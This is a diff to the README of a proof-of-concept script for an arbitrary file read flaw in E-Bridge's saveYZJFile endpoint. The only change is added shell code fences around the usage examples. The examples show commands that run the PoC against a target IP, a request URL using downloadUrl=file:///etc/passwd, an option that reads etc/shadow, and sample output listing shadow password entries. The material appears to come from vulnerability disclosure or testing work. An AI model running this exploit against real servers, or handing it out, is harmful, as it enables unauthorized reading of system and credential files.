@@ -17,12 +17,15 @@ optional arguments:
   -t TARGET, --target TARGET    访问的目录或文件 - 完整路径
   
 # 例子
+```shell
 python poc.py -i xx.xx.xx.xx
 
 [+] E-Bridge saveYZJFile任意文件读取漏洞 OS: linux http://xx.xx.xx.xx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt
 [+] http://xx.xx.xx.xx maybe vulnerable
+```
 
 Linux系统
+```shell
 python poc.py -i xx.xx.xx.xx -t etc/shadow
 
 [+] E-Bridge saveYZJFile任意文件读取漏洞 OS: linux http://xx.xx.xx.xx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt
@@ -34,5 +37,5 @@ bin:*:15980:0:99999:7:::
 daemon:*:15980:0:99999:7:::
 adm:*:15980:0:99999:7:::
 ......
-
+```
 
